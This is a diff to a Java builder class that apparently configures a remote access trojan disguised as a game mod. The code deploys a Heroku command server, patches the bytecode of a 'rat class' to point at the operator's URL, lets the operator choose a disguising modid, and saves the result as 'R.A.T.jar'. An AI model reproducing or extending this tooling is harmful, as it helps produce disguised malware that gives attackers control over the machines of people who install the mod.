@@ -5,10 +5,7 @@ import com.heroku.api.HerokuAPI;
 import jdk.internal.org.objectweb.asm.ClassReader;
 import jdk.internal.org.objectweb.asm.ClassWriter;
 import jdk.internal.org.objectweb.asm.Opcodes;
-import jdk.internal.org.objectweb.asm.tree.AbstractInsnNode;
-import jdk.internal.org.objectweb.asm.tree.ClassNode;
-import jdk.internal.org.objectweb.asm.tree.LdcInsnNode;
-import jdk.internal.org.objectweb.asm.tree.MethodNode;
+import jdk.internal.org.objectweb.asm.tree.*;
 import net.lingala.zip4j.ZipFile;
 import org.apache.commons.io.FileUtils;
 import org.apache.commons.io.IOUtils;
@@ -79,7 +76,7 @@ public class Tasks {
         deployHerokuApp();
         //client
         separator();
-        changeModServerURL();
+        buildMod();
         separator(); //last separator
     }
 
@@ -334,14 +331,16 @@ public class Tasks {
 
     /* Client */
 
-    public static void changeModServerURL() {
+    public static void buildMod() {
         try {
-            log("Modifying rat class...");
+            log("Changing server URL...");
 
-            //find ldc instruction of the url and replace it with our own
+            //open class
             InputStream is = Files.newInputStream(ratClass.toFile().toPath());
             byte[] bytes = IOUtils.toByteArray(is);
             ClassNode cn = getNode(bytes);
+
+            //find ldc instruction of the url and replace it with our own
             for (MethodNode mn : cn.methods){
                 for (AbstractInsnNode ain : mn.instructions.toArray()){
                     if (ain.getOpcode() == Opcodes.LDC){
@@ -355,12 +354,25 @@ public class Tasks {
                 }
             }
 
+            ok("Changed server URL.");
+
+            log("Changing modid...");
+
+            log("Choose a modid for the mod: ");
+
+            //find and replace modid key in @Mod annotation
+            cn.visibleAnnotations.get(0).values.set(1, sc.nextLine());
+
+            ok("Changed modid.");
+
+            log("Saving as jar...");
+
             //compile class to jar
             ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
             cn.accept(cw);
             saveAsJar(cw.toByteArray(), path + "\\R.A.T.jar");
 
-            ok("Modified rat class successfully.");
+            ok("Saved as jar.");
         } catch (Exception e) {
             error("Something went wrong while modifying rat class.");
             e.printStackTrace();
